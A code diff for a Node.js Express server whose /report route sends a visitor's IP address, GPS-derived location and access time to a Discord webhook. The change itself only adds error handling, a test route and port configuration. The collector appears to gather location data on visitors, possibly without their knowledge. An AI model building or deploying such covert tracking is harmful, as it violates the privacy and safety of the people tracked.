@@ -40,7 +40,7 @@ app.post('/report', async (req, res) => {
     console.error('GPS逆ジオ取得失敗:', err);
   }
 
-  // 📩 Discordへの通知
+  // 📩 Discord通知
   const message = {
     content: `📸 アクセス情報：
 - IPアドレス: ${ip}
@@ -52,15 +52,42 @@ app.post('/report', async (req, res) => {
 - アクセス時間: ${new Date().toLocaleString()}`
   };
 
-  await fetch(process.env.DISCORD_WEBHOOK, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(message)
-  });
+  try {
+    const webhookRes = await fetch(process.env.DISCORD_WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(message)
+    });
+
+    if (!webhookRes.ok) {
+      const errText = await webhookRes.text();
+      console.error(`❌ Discord通知失敗: ${webhookRes.status} - ${errText}`);
+    } else {
+      console.log('✅ Discord通知成功');
+    }
+  } catch (err) {
+    console.error('❌ Discord通知エラー:', err);
+  }
 
   res.sendStatus(200);
 });
 
-app.listen(3000, () => {
-  console.log('📡 Listening on http://localhost:3000');
+// ✅ テスト送信用ルート（任意）
+app.get('/test', async (req, res) => {
+  try {
+    const resp = await fetch(process.env.DISCORD_WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: '✅ テスト送信成功しました' })
+    });
+    res.send('テスト送信完了');
+  } catch (err) {
+    console.error('テスト送信エラー:', err);
+    res.status(500).send('テスト失敗');
+  }
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`📡 Server running on http://localhost:${PORT}`);
 });
